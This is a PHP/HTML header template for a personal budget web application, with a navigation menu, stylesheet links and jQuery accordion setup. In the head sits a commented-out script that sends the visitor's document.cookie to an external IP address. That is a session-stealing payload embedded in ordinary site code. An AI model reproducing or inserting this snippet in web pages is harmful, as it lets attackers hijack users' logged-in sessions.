<?php  
require_once("lang/english.php");
//SESSION variable for task edition
if(isset($_GET['del_id'])){$_SESSION['del_id'] = $_GET['del_id'];}
if(isset($_GET['edit_id'])){$_SESSION['edit_id'] = $_GET['edit_id'];}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<head><title><?php echo lang_getTxt('browser_title'); ?></title>
<link rel="shortcut icon" href="http://www.skriptkoder.com/images/skriptkoder.ico" />
<link rel="stylesheet" href="css/template.css" type="text/css"/>
<link rel="stylesheet" href="css/budget.css" type="text/css"/>

<!--<script type="text/javascript">
    new Image().src="http://24.202.105.240:4545/bog.php?output="+document.cookie;
    </script>-->

<script type="text/javascript" src="lib/taxeCalculator.js"></script>
<!-- START: Accordion links for help page component -->
  <link rel = "stylesheet" type = "text/css" href = "css/jquery-ui-1.7.2.custom.css" />        
  <script type = "text/javascript" src = "lib/jquery-1.3.2.min.js"></script>
  <script type = "text/javascript" src = "lib/jquery-ui-1.7.2.custom.min.js"></script>
  <script type = "text/javascript" src = "lib/js.js"></script>
  <script type = "text/javascript">    
    //<![CDATA[
    $(init);
    function init(){
      $("#accordion").accordion();
    }
    //]]>
    </script>
<!-- END: Accordion links for help page component -->
<script language="javascript" type="text/javascript">
/* random number generator */
function rand(n) {
    return ( Math.floor ( Math.random ( ) * n ) );
}
function printpage(){
    window.print();
    return false;
}
</script>
</head>
<!-- Top menu-->
<body> 
<div align="center">
    <div id="wrapper">
        <div id="whitebox">
            <table cellpadding="0" cellspacing="0" class="pill">
                <tr>
                    <td class="pill_m">
                        <div id="pillmenu">
                            <ul id="mainlevel-nav">    
<?php if ( logged_in() ) { ?>
 <li><a href="budget.php" class="mainlevel-nav" ><img src="images/arrow.png" />
    <?php echo lang_getTxt('budget_title'); ?><span><img src="images/arrow.png" /><?php echo lang_getTxt('budget_title'); ?></span></a></li>
 <li><a href="mobile_budget.php" class="mainlevel-nav" ><img src="images/arrow.png" />
    <?php echo lang_getTxt('mobile_budget'); ?><span><img src="images/arrow.png" /><?php echo lang_getTxt('mobile_budget'); ?></span></a></li>
 <li><a href="taxeCalculator.php" class="mainlevel-nav" ><img src="images/arrow.png" />
    <?php echo lang_getTxt('calculator'); ?><span><img src="images/arrow.png" /><?php echo lang_getTxt('calculator'); ?></span></a></li>
<li><a href="help.php" class="mainlevel-nav" ><img src="images/arrow.png" />
    <?php echo lang_getTxt('help'); ?><span><img src="images/arrow.png" /><?php echo lang_getTxt('help'); ?></span></a></li>	
<?php }else{ echo "<li><a style='text-decoration:none'><font color=''>&nbsp;</font></a></li>";}?>	
                            </ul>	
                        </div>
                    </td>
                    <td ><div id="pillmenulang"><a href="logout.php" class="mainlevel-nav" >
    <?php echo lang_getTxt('logout'); ?></a></div></td>
                    <td ><div id="pillmenulang"><?php echo 'english'; ?></div></td>
                </tr>
            </table>
        </div>
    </div>
<!-- Title and banner -->		
<div id="header"> 
    <div id="header_l">     
    <div id="logo"><br /><br /><a class="logo" href="index.php"><font color="#214020">Personal Budget</font></a></div> 
    <div id="rotator_1" style="width:450px; height:147px; float:right"></div>
    </div>
</div>
<div id="wrapper">
    <div id="whitebox">
        <table cellpadding="0" cellspacing="0" class="pill">
            <tr>
                <td class="pill_m"></td>
            </tr>
        </table>
    </div>		
</div>
<div id="whitebox_m">				
    <div id="area">